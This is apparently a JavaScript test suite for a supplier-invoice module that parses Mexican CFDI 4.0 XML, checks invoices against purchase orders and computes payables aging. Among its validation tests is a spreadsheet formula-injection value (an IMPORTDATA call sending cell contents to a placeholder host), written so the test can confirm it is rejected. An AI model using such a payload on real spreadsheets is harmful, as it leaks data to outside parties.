// Facturas de proveedor (4.5): lectura del CFDI 4.0, factura extranjera, validación contra la orden, días de crédito,
// vencimiento y cuentas por pagar. Solo lógica pura (sin servicios de Google). Datos inventados: el RFC del proveedor es el
// de pruebas que publica el SAT (EKU9003173C9); ninguna factura real va en el repositorio.
// Uso: node tests/facturas.test.js .   (carpeta con Code.js)
const fs=require('fs'),vm=require('vm'),assert=require('assert'),path=require('path');
const ctx={console};vm.createContext(ctx);
vm.runInContext(fs.readFileSync(path.join(process.argv[2]||'.','Code.js'),'utf8'),ctx);
const run=c=>vm.runInContext(c,ctx);
const falla=(fn,re)=>assert.throws(fn,e=>re.test(e.message),'debía fallar con '+re);
const plano=o=>JSON.parse(JSON.stringify(o)); // objetos del contexto vm → objetos de Node (para deepStrictEqual)

const HELGEN='HSE240304PC1', PROV='EKU9003173C9', HOY='2026-10-27';
const UUID1='6F1C5E2A-3B4D-4C5E-9F60-718293A4B5C6', UUID2='0A1B2C3D-4E5F-4A6B-8C7D-9E0F1A2B3C4D';

/** CFDI 4.0 de prueba; o = cambios. Trae un Emisor falso en un comentario y un Impuestos por concepto (no deben leerse).
 *  Si no se dan, el IVA es 16 % de (subtotal − descuento) y el total cuadra: subtotal − descuento + trasladados − retenidos (+ locales). */
function cfdi(o){
  const a=Object.assign({ns:'http://www.sat.gob.mx/cfd/4',version:'4.0',tipo:'I',fecha:'2026-10-20T10:15:00',serie:'A',folio:'1234',
    moneda:'MXN',subtotal:'1000.00',descuento:null,metodo:'PUE',forma:'03',emisor:PROV,
    nombreEmisor:'ESCUELA KEMPER URGATE &amp; CIA',receptor:HELGEN,uso:'G03',ret:null,local:null,uuid:UUID1.toLowerCase(),timbre:true},o||{});
  const n=v=>Number(v||0), base=n(a.subtotal)-n(a.descuento);
  if(!('tras' in (o||{}))) a.tras=(Math.round(base*16)/100).toFixed(2);
  if(!('total' in (o||{}))) a.total=(base+n(a.tras)-n(a.ret)+(a.local?n(a.local.tras)-n(a.local.ret):0)).toFixed(2);
  return '﻿<?xml version="1.0" encoding="UTF-8"?>\n'+
  `<cfdi:Comprobante xmlns:cfdi="${a.ns}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Version="${a.version}" Serie="${a.serie}" Folio="${a.folio}"
    Fecha="${a.fecha}" SubTotal="${a.subtotal}"${a.descuento!=null?` Descuento="${a.descuento}"`:''} Moneda="${a.moneda}" Total="${a.total}"
    TipoDeComprobante="${a.tipo}" MetodoPago="${a.metodo}" FormaPago="${a.forma}" Exportacion="01" LugarExpedicion="76000">
  <!-- <cfdi:Emisor Rfc="AAA010101AAA" Nombre="FALSO"/> -->
  <cfdi:Emisor Rfc="${a.emisor}" Nombre="${a.nombreEmisor}" RegimenFiscal="601"/>
  <cfdi:Receptor Rfc="${a.receptor}" Nombre="HELGEN SERVICIOS ESPECIALIZADOS" DomicilioFiscalReceptor="76000" RegimenFiscalReceptor="601" UsoCFDI="${a.uso}"/>
  <cfdi:Conceptos>
    <cfdi:Concepto ClaveProdServ="43191500" Cantidad="1" ClaveUnidad="H87" Descripcion="Modulo &quot;4G&quot; &lt;LTE&gt;" ValorUnitario="1000.00" Importe="1000.00" ObjetoImp="02">
      <cfdi:Impuestos><cfdi:Traslados><cfdi:Traslado Base="1000.00" Impuesto="002" TipoFactor="Tasa" TasaOCuota="0.160000" Importe="999.99"/></cfdi:Traslados></cfdi:Impuestos>
    </cfdi:Concepto>
  </cfdi:Conceptos>
  <cfdi:Impuestos${a.tras!=null?` TotalImpuestosTrasladados="${a.tras}"`:''}${a.ret!=null?` TotalImpuestosRetenidos="${a.ret}"`:''}>
    <cfdi:Traslados><cfdi:Traslado Base="1000.00" Impuesto="002" TipoFactor="Tasa" TasaOCuota="0.160000" Importe="160.00"/></cfdi:Traslados>
  </cfdi:Impuestos>
  <cfdi:Complemento>${a.local?`<implocal:ImpuestosLocales xmlns:implocal="http://www.sat.gob.mx/implocal" version="1.0" TotaldeRetenciones="${a.local.ret}" TotaldeTraslados="${a.local.tras}"/>`:''}${a.timbre?`<tfd:TimbreFiscalDigital xmlns:tfd="http://www.sat.gob.mx/TimbreFiscalDigital" Version="1.1" UUID="${a.uuid}" FechaTimbrado="2026-10-20T10:16:00" RfcProvCertif="SAT970701NN3" SelloCFD="abc" NoCertificadoSAT="00001000000500000000" SelloSAT="def"/>`:''}</cfdi:Complemento>
</cfdi:Comprobante>`;
}

// ---- leerCfdi ----
{
  const f=ctx.leerCfdi(cfdi());
  assert.strictEqual(f.tipo,'CFDI'); assert.strictEqual(f.version,'4.0'); assert.strictEqual(f.tipoComprobante,'I');
  assert.strictEqual(f.fecha,'2026-10-20'); assert.strictEqual(f.serieFolio,'A-1234'); assert.strictEqual(f.moneda,'MXN');
  assert.strictEqual(f.subtotal,1000); assert.strictEqual(f.descuento,0); assert.strictEqual(f.total,1160);
  assert.strictEqual(f.trasladados,160,'impuestos del comprobante, no los del concepto'); assert.strictEqual(f.retenidos,0);
  assert.strictEqual(f.emisor.rfc,PROV,'el Emisor del comentario se ignora'); assert.strictEqual(f.emisor.nombre,'ESCUELA KEMPER URGATE & CIA');
  assert.strictEqual(f.receptor.rfc,HELGEN); assert.strictEqual(f.usoCfdi,'G03'); assert.strictEqual(f.metodoPago,'PUE');
  assert.strictEqual(f.uuid,UUID1,'UUID en mayúsculas');
  const g=ctx.leerCfdi(cfdi({serie:'',folio:'77',descuento:'50.00',ret:'106.67',metodo:'ppd'}));
  assert.strictEqual(g.serieFolio,'77'); assert.strictEqual(g.descuento,50); assert.strictEqual(g.retenidos,106.67); assert.strictEqual(g.metodoPago,'PPD');
  falla(()=>ctx.leerCfdi(''),/vacío/);
  falla(()=>ctx.leerCfdi('%PDF-1.7 ...'),/no es un CFDI/);
  falla(()=>ctx.leerCfdi('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "b">]>'+cfdi().slice(1)),/no permitidas/);
  falla(()=>ctx.leerCfdi(cfdi({ns:'http://www.sat.gob.mx/cfd/3',version:'3.3'})),/3\.3/);
  falla(()=>ctx.leerCfdi(cfdi({ns:'http://example.com/otro'})),/no es un CFDI 4\.0/);
  falla(()=>ctx.leerCfdi(cfdi({timbre:false})),/no está timbrado/);
  falla(()=>ctx.leerCfdi(cfdi({total:'abc'})),/total del CFDI no es válido/);
  falla(()=>ctx.leerCfdi(cfdi({fecha:'20/10/2026'})),/fecha de emisión/);
  // El total cuadra con sus partes (±0.02); el descuento no pasa del subtotal; los impuestos locales (implocal) cuentan
  falla(()=>ctx.leerCfdi(cfdi({total:'99999.00'})),/no cuadra: su total \(\$99,999\.00\) no es .* \(\$1,160\.00\)/);
  assert.strictEqual(ctx.leerCfdi(cfdi({total:'1160.02'})).total,1160.02,'redondeo');
  falla(()=>ctx.leerCfdi(cfdi({total:'1160.03'})),/no cuadra/);
  falla(()=>ctx.leerCfdi(cfdi({subtotal:'100.00',descuento:'1100.00',tras:'0.00',total:'0.01'})),/descuento es mayor que el subtotal/);
  const l=ctx.leerCfdi(cfdi({local:{tras:'30.00',ret:'5.00'}}));
  assert.deepStrictEqual([l.trasladados,l.retenidos,l.total],[190,5,1185],'ISH y 5 al millar');
  falla(()=>ctx.leerCfdi(cfdi({local:{tras:'30.00',ret:'0.00'},total:'1160.00'})),/no cuadra/);
}

// ---- validarXml ----
{
  const bytes=s=>Array.from(Buffer.from(s)).map(b=>b>127?b-256:b); // como Apps Script: bytes con signo
  assert.strictEqual(ctx.validarXml(bytes(cfdi())),true,'con BOM');
  assert.strictEqual(ctx.validarXml(bytes('\n  <x/>')),true);
  falla(()=>ctx.validarXml(bytes('%PDF-1.7')),/no es un XML/);
  falla(()=>ctx.validarXml([]),/Adjunta el XML/);
}

// ---- Días de crédito y vencimiento ----
{
  assert.strictEqual(ctx.normalizarDiasCredito('30'),30); assert.strictEqual(ctx.normalizarDiasCredito(0),0);
  assert.strictEqual(ctx.normalizarDiasCredito(' 180 '),180);
  ['','-1','1.5','181','treinta',null].forEach(v=>falla(()=>ctx.normalizarDiasCredito(v),/días de crédito/));
  assert.strictEqual(ctx.diasCreditoGuardados(''),0,'órdenes viejas = contado'); assert.strictEqual(ctx.diasCreditoGuardados(45),45);
  // Órdenes anteriores sin días: los de sus condiciones de pago, si los dicen
  assert.deepStrictEqual(['Crédito 30 días',' crédito  45 DIAS ','Neto 60 dias','Contado','Crédito a 500 días','',null].map(x=>ctx.diasCreditoDeCondiciones(x)),
    [30,45,60,0,0,0,0]);
  // UTF-8 con un punto de código fuera de rango (F4 90 80 80): no truena, queda como �
  assert.strictEqual(ctx.textoUtf8([0x41,0xF4,0x90,0x80,0x80,0x42]).slice(0,2),'A\uFFFD');
  assert.strictEqual(ctx.fechaVencimiento('2026-10-27',30),'2026-11-26');
  assert.strictEqual(ctx.fechaVencimiento('2026-12-15',30),'2027-01-14');
  assert.strictEqual(ctx.fechaVencimiento('2028-02-28',1),'2028-02-29');
  assert.strictEqual(ctx.fechaVencimiento('2026-10-27',''),'2026-10-27','sin días = vence el día de emisión');
  assert.strictEqual(ctx.diasEntre('2026-10-17','2026-10-27'),10); assert.strictEqual(ctx.diasEntre('2026-11-10','2026-10-27'),-14);
}

// ---- validarFacturaProveedor: CFDI ----
const OC={folio:'OC-2026-0001',estado:'Emitida',moneda:'MXN',subtotal:1000,total:1160,rfc:PROV,proveedorId:PROV};
const CTX=o=>Object.assign({rfcHelgen:HELGEN,hoy:HOY,facturas:[]},o||{});
const leer=o=>ctx.leerCfdi(cfdi(o));
{
  assert.deepStrictEqual(plano(ctx.validarFacturaProveedor(leer(),OC,CTX())),{neto:1000,facturado:1000,actualizarRfc:false});
  falla(()=>ctx.validarFacturaProveedor(leer({tipo:'E'}),OC,CTX()),/nota de crédito/);
  falla(()=>ctx.validarFacturaProveedor(leer({tipo:'P'}),OC,CTX()),/complemento de pago/);
  falla(()=>ctx.validarFacturaProveedor(leer({tipo:'T'}),OC,CTX()),/no es una factura de ingreso/);
  falla(()=>ctx.validarFacturaProveedor(leer({receptor:'AAA010101AAA'}),OC,CTX()),/a nombre del RFC AAA010101AAA, no de Helgen/);
  falla(()=>ctx.validarFacturaProveedor(leer({emisor:'AAA010101AAA'}),OC,CTX()),/la orden OC-2026-0001 es de RFC EKU9003173C9/);
  falla(()=>ctx.validarFacturaProveedor(leer({moneda:'USD'}),OC,CTX()),/es en USD y la orden OC-2026-0001 en MXN/);
  falla(()=>ctx.validarFacturaProveedor(leer({fecha:'2026-10-28T09:00:00'}),OC,CTX()),/no puede ser futura/);
  falla(()=>ctx.validarFacturaProveedor(leer({uuid:'no-es-uuid'}),OC,CTX()),/UUID\) del CFDI no es válido/);
  falla(()=>ctx.validarFacturaProveedor(leer(),Object.assign({},OC,{estado:'Cancelada'}),CTX()),/está cancelada/);
  // Orden sin RFC (o con el genérico): se acepta y el proveedor toma el RFC del CFDI
  assert.strictEqual(ctx.validarFacturaProveedor(leer(),Object.assign({},OC,{rfc:''}),CTX()).actualizarRfc,true);
  assert.strictEqual(ctx.validarFacturaProveedor(leer(),Object.assign({},OC,{rfc:'XEXX010101000'}),CTX()).actualizarRfc,true);
  // UUID repetido: solo cuenta si la otra factura está Vigente
  const otra={folio:'FPR-2026-0001',tipo:'CFDI',uuid:UUID1,serieFolio:'A-1234',proveedorId:PROV,ocFolio:'OC-2026-0009',estado:'Vigente',subtotal:10,descuento:0};
  falla(()=>ctx.validarFacturaProveedor(leer(),OC,CTX({facturas:[otra]})),/ya está registrada \(FPR-2026-0001\)/);
  ctx.validarFacturaProveedor(leer(),OC,CTX({facturas:[Object.assign({},otra,{estado:'Cancelada'})]}));
  // Cobertura: varias facturas por orden (entregas parciales) hasta el subtotal + 1.00, comparando subtotal − descuento
  const previa={folio:'FPR-2026-0002',tipo:'CFDI',uuid:UUID2,serieFolio:'A-1',proveedorId:PROV,ocFolio:'oc-2026-0001',estado:'Vigente',subtotal:600,descuento:0};
  falla(()=>ctx.validarFacturaProveedor(leer(),OC,CTX({facturas:[previa]})),/\(\$1,600\.00 MXN sin IVA\) supera su subtotal \(\$1,000\.00 MXN\)/);
  assert.strictEqual(ctx.validarFacturaProveedor(leer({subtotal:'400.00',total:'464.00'}),OC,CTX({facturas:[previa]})).facturado,1000);
  assert.strictEqual(ctx.validarFacturaProveedor(leer({subtotal:'401.00',total:'465.16'}),OC,CTX({facturas:[previa]})).facturado,1001,'tolerancia 1.00');
  falla(()=>ctx.validarFacturaProveedor(leer({subtotal:'401.01',total:'465.17'}),OC,CTX({facturas:[previa]})),/supera su subtotal/);
  assert.strictEqual(ctx.validarFacturaProveedor(leer({subtotal:'1100.00',descuento:'100.00',total:'1160.00'}),OC,CTX()).neto,1000,'descuento');
  // Retenciones (persona física): el total baja, el neto (sin IVA) no
  assert.strictEqual(ctx.validarFacturaProveedor(leer({ret:'106.67',total:'1053.33'}),OC,CTX()).neto,1000);
  // Método de pago: solo PUE o PPD (nada que Sheets lea como fórmula)
  falla(()=>ctx.validarFacturaProveedor(leer({metodo:'=IMPORTDATA(&quot;https://x.example/?d=&quot;&amp;A2)'}),OC,CTX()),/PUE o PPD/);
  falla(()=>ctx.validarFacturaProveedor(leer({metodo:''}),OC,CTX()),/PUE o PPD/);
  // El total facturado tampoco pasa el total de la orden: orden al 0 % con factura al 16 %
  falla(()=>ctx.validarFacturaProveedor(leer(),Object.assign({},OC,{total:1000}),CTX()),/total facturado de la orden OC-2026-0001 \(\$1,160\.00 MXN\) supera el total de la orden \(\$1,000\.00 MXN\)/);
  const conTotal={...previa,total:696};
  falla(()=>ctx.validarFacturaProveedor(leer({subtotal:'400.00',tras:'200.00',total:'600.00'}),OC,CTX({facturas:[conTotal]})),/supera el total de la orden/);
  assert.strictEqual(ctx.validarFacturaProveedor(leer({subtotal:'400.00'}),OC,CTX({facturas:[conTotal]})).facturado,1000);
  assert.strictEqual(ctx.netoFactura({subtotal:100,descuento:1100}),0,'el neto nunca es negativo');
  // Orden sin RFC: el primer CFDI vigente fija el emisor; otro RFC (o una factura extranjera) ya no entra en esa orden
  const OCS=Object.assign({},OC,{rfc:'',proveedorId:'SIN-RFC:kemper'});
  const primera={folio:'FPR-2026-0007',tipo:'CFDI',uuid:UUID2,serieFolio:'A-1',rfcEmisor:PROV,proveedorId:'SIN-RFC:kemper',ocFolio:'OC-2026-0001',estado:'Vigente',subtotal:300,descuento:0};
  const r2=ctx.validarFacturaProveedor(leer({subtotal:'500.00',total:'580.00'}),OCS,CTX({facturas:[primera]}));
  assert.deepStrictEqual([r2.facturado,r2.actualizarRfc],[800,false],'mismo emisor: entra; el RFC ya se tomó con la primera');
  falla(()=>ctx.validarFacturaProveedor(leer({emisor:'AAA010101AAA',subtotal:'500.00',total:'580.00'}),OCS,CTX({facturas:[primera]})),
    /ya tiene facturas de RFC EKU9003173C9 \(FPR-2026-0007\)/);
  falla(()=>ctx.validarFacturaProveedor(ctx.normalizarFacturaExtranjera({numero:'X1',fecha:'2026-10-10',moneda:'MXN',subtotal:'5'},HOY),OCS,
    CTX({facturas:[primera]})),/ya tiene facturas CFDI de RFC EKU9003173C9/);
  assert.strictEqual(ctx.validarFacturaProveedor(leer({emisor:'AAA010101AAA',subtotal:'500.00',total:'580.00'}),OCS,
    CTX({facturas:[Object.assign({},primera,{estado:'Cancelada'})]})).actualizarRfc,true,'la cancelada no fija el emisor');
}

// ---- facturacionDeOrden: solo una orden facturada completa se paga por el total de sus facturas ----
{
  const O={folio:'OC-2026-0001',subtotal:1000};
  const fa=(t,sub,o)=>Object.assign({folio:'F'+t,ocFolio:'oc-2026-0001',estado:'Vigente',subtotal:sub,descuento:0,total:t},o||{});
  assert.deepStrictEqual(plano(ctx.facturacionDeOrden([],O)),{facturas:0,total:0,neto:0,completa:false});
  assert.deepStrictEqual(plano(ctx.facturacionDeOrden([fa(696,600)],O)),{facturas:1,total:696,neto:600,completa:false},'parcial');
  assert.strictEqual(ctx.facturacionDeOrden([fa(696,600),fa(357.33,399,{retenidos:106.67})],O).completa,true,'tolerancia 1.00');
  assert.strictEqual(ctx.facturacionDeOrden([fa(696,600),fa(357,398.99)],O).completa,false);
  assert.strictEqual(ctx.facturacionDeOrden([fa(1160,1000,{estado:'Cancelada'})],O).completa,false,'las canceladas no cuentan');
  assert.strictEqual(ctx.facturacionDeOrden([fa(1160,1000,{ocFolio:'OC-2026-0002'})],O).facturas,0,'otra orden');
}

// ---- Factura extranjera (sin CFDI) ----
{
  const OCX={folio:'OC-2026-0003',estado:'Pagada',moneda:'USD',subtotal:250,total:250,rfc:'',proveedorId:'SIN-RFC:jlcpcb'};
  const ext=p=>ctx.normalizarFacturaExtranjera(Object.assign({numero:'W2026070815023249',fecha:'2026-10-10',moneda:'usd',subtotal:'240.5',impuestos:''},p||{}),HOY);
  const f=ext();
  assert.strictEqual(f.tipo,'Extranjera'); assert.strictEqual(f.uuid,''); assert.strictEqual(f.moneda,'USD');
  assert.strictEqual(f.total,240.5); assert.strictEqual(ext({impuestos:'9.5'}).total,250,'el total lo calcula el servidor');
  assert.deepStrictEqual(plano(ctx.validarFacturaProveedor(f,OCX,CTX())),{neto:240.5,facturado:240.5,actualizarRfc:false});
  falla(()=>ext({numero:' '}),/número de la factura/);
  falla(()=>ext({fecha:'2026-11-01'}),/no puede ser futura/);
  falla(()=>ext({subtotal:'0'}),/mayor a 0/);
  falla(()=>ext({subtotal:'-5'}),/no es válido/);
  falla(()=>ctx.validarFacturaProveedor(ext({moneda:'EUR'}),OCX,CTX()),/es en EUR y la orden OC-2026-0003 en USD/);
  falla(()=>ctx.validarFacturaProveedor(ext({impuestos:'50000'}),OCX,CTX()),/supera el total de la orden \(\$250\.00 USD\)/,'impuestos mal capturados');
  falla(()=>ctx.validarFacturaProveedor(f,Object.assign({},OCX,{rfc:PROV}),CTX()),/tiene RFC mexicano \(EKU9003173C9\): registra su factura con el XML/);
  ctx.validarFacturaProveedor(f,Object.assign({},OCX,{rfc:'XEXX010101000'}),CTX()); // RFC genérico de extranjeros: sí se acepta
  const ya={folio:'FPR-2026-0005',tipo:'Extranjera',uuid:'',serieFolio:'w2026070815023249',proveedorId:'SIN-RFC:jlcpcb',ocFolio:'OC-2026-0002',estado:'Vigente',subtotal:5,descuento:0};
  falla(()=>ctx.validarFacturaProveedor(f,OCX,CTX({facturas:[ya]})),/ya está registrada \(FPR-2026-0005\)/);
  ctx.validarFacturaProveedor(f,OCX,CTX({facturas:[Object.assign({},ya,{proveedorId:'SIN-RFC:otro'})]})); // mismo número, otro proveedor
}

// ---- Cuentas por pagar ----
{
  const fac=(folio,oc,moneda,subtotal,total,venc,o)=>Object.assign({folio,tipo:'CFDI',serieFolio:folio,ocFolio:oc,proyectoFolio:'PRY-2026-0002',
    moneda,subtotal,descuento:0,total,fechaEmision:'2026-01-01',fechaVencimiento:venc,metodoPago:'PUE',estado:'Vigente',nombreEmisor:'X'},o||{});
  const ord=(folio,estado,moneda,subtotal,fecha)=>({folio,estado,moneda,subtotal,fecha,proyectoFolio:'PRY-2026-0002',proveedor:'Proveedor '+folio});
  const r=plano(ctx.antiguedadCxp({hoy:HOY,
    facturas:[fac('F1','OC-1','MXN',1000,1160,'2026-11-10'), fac('F2','OC-2','MXN',500,580,'2026-10-17'),
      fac('F3','OC-3','USD',100,100,'2026-08-28'), fac('F4','OC-4','MXN',1000,1160,'2026-09-01',{metodoPago:'PPD'}),
      fac('F5','OC-1','MXN',50,58,'2026-09-01',{estado:'Cancelada'}), fac('F6','OC-5','MXN',10,11.6,'2026-09-01'),
      fac('F7','OC-2','MXN',200,232,'2026-06-01'), fac('F8','OC-1','MXN',10,11.6,'2026-10-27',{tipo:'Extranjera'})],
    ordenes:[ord('OC-1','Emitida','MXN',1010,'2026-09-01'), ord('OC-2','Recibida','MXN',1000,'2026-10-01'), ord('OC-3','Emitida','USD',100,'2026-08-01'),
      ord('OC-4','Pagada','MXN',2000,'2026-10-10'), ord('OC-5','Cancelada','MXN',10,'2026-08-01'), ord('OC-6','Emitida','MXN',500,'2026-10-05')],
    pagos:[{ocFolio:'oc-4',estado:'Vigente'},{ocFolio:'OC-1',estado:'Cancelado'}]}));
  assert.deepStrictEqual(r.abiertas.map(a=>a.folio),['F7','F3','F2','F8','F1'],'por vencimiento; sin pagadas, canceladas ni de órdenes canceladas');
  assert.deepStrictEqual(r.abiertas.map(a=>a.rango),['d90mas','d31a60','d1a30','porVencer','porVencer']);
  assert.strictEqual(r.abiertas.find(a=>a.folio==='F8').dias,0,'vence hoy = por vencer');
  assert.strictEqual(r.abiertas[0].proveedor,'Proveedor OC-2');
  assert.deepStrictEqual(r.totales,[
    {moneda:'MXN',facturas:4,porVencer:1171.6,d1a30:580,d31a60:0,d61a90:0,d90mas:232,vencido:812,total:1983.6},
    {moneda:'USD',facturas:1,porVencer:0,d1a30:0,d31a60:100,d61a90:0,d90mas:0,vencido:100,total:100}],'un total por moneda; nunca MXN + USD');
  assert.deepStrictEqual(r.faltantes.map(x=>[x.folio,x.faltante,x.pagada]),[['OC-4',1000,true],['OC-2',300,false],['OC-6',500,false]],
    'pagadas primero, luego por fecha; OC-1 y OC-3 completas, OC-5 cancelada');
  assert.deepStrictEqual(r.repPendientes,{n:1,folios:['F4']});
  assert.deepStrictEqual(r.rangos.map(x=>x.etiqueta),['Por vencer','Vencido 1–30','Vencido 31–60','Vencido 61–90','Vencido +90']);
  const vacio=plano(ctx.antiguedadCxp({hoy:HOY,facturas:[],ordenes:[],pagos:[]}));
  assert.deepStrictEqual([vacio.totales,vacio.abiertas,vacio.faltantes],[[],[],[]]);
}

// ---- Pestañas del libro de compras ----
{
  const H=run('HOJAS_COMPRAS');
  assert.strictEqual(H.OrdenesCompra.enc.indexOf('dias_credito'),35,'columna AJ, después de req_folio');
  assert.strictEqual(H.OrdenesCompra.enc.indexOf('req_folio'),34,'las columnas existentes no se mueven');
  assert.strictEqual(H.Proveedores.enc.indexOf('dias_credito'),7);
  const F=H.FacturasProveedor.enc;
  assert.strictEqual(F.length,34); assert.strictEqual(new Set(F).size,F.length,'encabezados únicos');
  H.FacturasProveedor.numeros.forEach(c=>assert(['subtotal','descuento','iva_trasladado','retenciones','total'].indexOf(F[c-1])!==-1,'formato de número solo en importes'));
}

console.log('OK facturas');
